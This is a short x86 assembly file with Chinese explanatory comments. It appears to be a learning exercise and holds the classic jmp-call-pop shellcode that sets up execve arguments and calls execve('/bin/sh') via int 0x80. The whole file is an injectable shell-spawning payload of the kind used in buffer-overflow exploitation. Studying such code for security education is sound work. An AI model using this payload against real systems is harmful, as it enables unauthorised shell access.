section .text
  global _start
    _start:
      
      	BITS 32
        jmp short two
   
   	one:
        pop ebx ; ebx储存字符串地址
        xor eax, eax ; 将eax置为0
        mov [ebx+7], al ;将al，也即是0替换*
        mov [ebx+8], ebx  ;将字符串的地址赋给AAAA所在的内存处(4 bytes)
        mov [ebx+12], eax ; 将0赋给BBBB所在内存处
        lea ecx, [ebx+8] ; ecx=ebx+8，也即是ecx储存/bin/sh\0的地址
        xor edx, edx ;edx为0，表示无环境变量
        mov al,  0x0b ;系统调用号
        int 0x80
        
    two:
        call one
        db '/bin/sh*AAAABBBB' 